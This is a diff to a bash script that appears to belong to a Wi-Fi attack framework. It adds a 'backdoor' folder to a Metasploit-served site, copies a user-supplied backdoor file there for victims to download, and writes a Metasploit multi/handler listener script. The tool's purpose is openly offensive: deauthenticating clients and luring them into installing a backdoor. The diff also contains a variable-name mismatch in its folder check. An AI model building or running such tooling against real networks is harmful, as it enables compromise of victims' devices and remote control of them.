@@ -41,6 +41,7 @@ win_auto_command="$WORK_DIR/lib/metasploit/win-auto-script.rc"
 linux_auto_command="$WORK_DIR/lib/metasploit/linux-auto-script.rc"
 macos_auto_command="$WORK_DIR/lib/metasploit/mac-auto-script.rc"
 android_auto_command="$WORK_DIR/lib/metasploit/android-auto-script.rc"
+path_site_metasploit="$WORK_DIR/sites/metasploit/"
 DEAUTHTIME="9999999999999"
 Metasp_configure=""
 revision=9
@@ -1679,9 +1680,11 @@ function attack {
                 read yn
                 case $yn in
                         1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
-                        2 ) matartodo; exitmode; break;;
-                        * ) echo "
-$general_case_error"; conditional_clear ;;
+                        2 ) matartodo;
+			    rm -r $path_site_metasploit/backdoor/*;
+			    exitmode;
+			    break;;
+                        * ) echo "$general_case_error"; conditional_clear ;;
                 esac
         done
 
@@ -2746,13 +2749,21 @@ function love {
 fi
 }
 function metasploit {
+	cd $path_site_metasploit
+	check_folder_backdoor=`find  -name backdoor -type d | grep -w "./backdoor"`
+	if [ "$check_folder_victim" = "./backdoor" ]; then
+		echo ""
+	else
+	 	mkdir backdoor
+	fi
+	cd $WORK_DIR
 	echo -ne " ${red}=>${white} Enter the location folder of backdoor : ${transparent}"
 	read folder
 	folder_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
-	cp $folder_backdoor/* $WORK_DIR/sites/metasploit/
+	cp $folder_backdoor/* $path_site_metasploit/backdoor
 
         mkdir $DUMP_PATH/data &>$flux_output_device
-    	cp -r  $WORK_DIR/sites/metasploit/* $DUMP_PATH/data
+    	cp -r  $path_site_metasploit/* $DUMP_PATH/data
 	rm -rf $script_listerning
 	touch $script_listerning
 	echo "use exploit/multi/handler" > $script_listerning
